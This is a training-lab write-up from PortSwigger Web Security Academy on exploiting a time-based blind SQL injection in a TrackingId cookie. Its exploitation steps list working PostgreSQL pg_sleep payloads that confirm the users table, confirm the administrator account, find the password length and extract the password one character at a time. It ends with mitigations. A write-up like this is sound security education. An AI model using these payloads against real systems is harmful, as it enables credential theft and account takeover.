# Blind SQL Injection via TrackingId Cookie (Time-Based)

## Summary

A time-based blind SQL injection vulnerability was identified in the `TrackingId` cookie parameter. The application does not return query results or errors, but database query execution can be inferred through response delays.

This allows an attacker to extract sensitive data from the backend database.

---

## Target Environment

| Field | Detail |
|---|---|
| Platform | PortSwigger Web Security Academy (Lab) |
| Injection Point | `TrackingId` cookie |
| Database | PostgreSQL (inferred from `pg_sleep()` behavior) |

---

## Vulnerability Description

The application processes the `TrackingId` cookie as part of a backend SQL query without proper sanitization.

Since no output or error messages are returned, the vulnerability is classified as **blind SQL injection**. However, because queries are executed synchronously, time delays can be used as a side channel to confirm execution.

---

## Testing & Exploitation

**Assume baseline cookie:**
```
TrackingId=xyz
```

### Step 1: Initial Injection Test

To confirm whether input is executed, a conditional delay was introduced:

```sql
TrackingId=xyz'||CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END--
```

- ✅ Observed delay: ~5 seconds
- ✅ Confirms query execution

---

### Step 2: Verifying Table Existence

```sql
TrackingId=xyz'||CASE 
WHEN ((SELECT 1 FROM users LIMIT 1)=1) 
THEN pg_sleep(5) ELSE NULL END--
```

**Explanation:**
- If the `users` table exists and contains at least one row, the condition evaluates to true
- The delay confirms successful query execution on the table

---

### Step 3: Identifying Target User

```sql
TrackingId=xyz'||CASE 
WHEN (EXISTS(SELECT 1 FROM users WHERE username='administrator')) 
THEN pg_sleep(5) ELSE NULL END--
```

- ✅ Delay confirms that the `administrator` user exists

---

### Step 4: Determining Password Length

```sql
TrackingId=xyz'||CASE 
WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator') > 10 
THEN pg_sleep(5) ELSE NULL END--
```

By incrementing the comparison value, the password length was determined to be **20 characters**.

---

### Step 5: Extracting Password Characters

Using **Burp Suite Community Edition Intruder**, characters were extracted one by one:

```sql
TrackingId=xyz'||CASE 
WHEN (SUBSTRING(password,1,1)='a' AND username='administrator') 
THEN pg_sleep(5) ELSE NULL END--
```

- Payload iterated over all possible characters
- A delay indicated the correct character
- Process repeated for all positions (1–20)

**Intruder results — character extraction in action:**

![Burp Suite Intruder Results](SQLi.png)

> Request 3 (payload `c`) shows a response time of **5269ms** — confirming `c` is the correct character at that position. All other payloads responded in ~200–500ms, well below the 5-second threshold.

---

## Impact

An attacker can:

- Enumerate database structure
- Extract sensitive user credentials
- Gain unauthorized access to privileged accounts

This can lead to **full account compromise** and potential system-wide access.

---

## Mitigation

| Mitigation | Detail |
|---|---|
| Parameterized queries | Use prepared statements — never concatenate user input into SQL |
| Input validation | Strictly validate and sanitize all user-supplied input |
| ORM frameworks | Use an ORM to abstract raw query construction |
| Error handling | Never expose database errors to end users |

---

## Key Takeaways

> **Lack of visible errors does not indicate security.**

- Blind SQL injection can be detected using timing-based techniques
- Proper URL encoding is required for payload execution in HTTP requests
- Time-based side channels are reliable even when no data is reflected in the response